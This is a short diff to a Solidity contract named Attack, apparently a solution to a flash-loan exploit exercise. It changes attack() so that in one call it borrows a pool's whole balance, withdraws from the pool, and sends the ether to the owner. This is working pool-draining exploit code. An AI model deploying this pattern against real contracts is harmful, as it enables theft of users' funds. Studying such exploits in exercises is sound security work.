@@ -14,9 +14,6 @@ contract Attack is IFlashLoanEtherReceiver {
 
     function attack() external {
         _pool.flashLoan(address(_pool).balance);
-    }
-
-    function finalize() external {
         _pool.withdraw();
         (bool success,) = _owner.call{ value: address(this).balance }("");
         require(success, "attack failed");
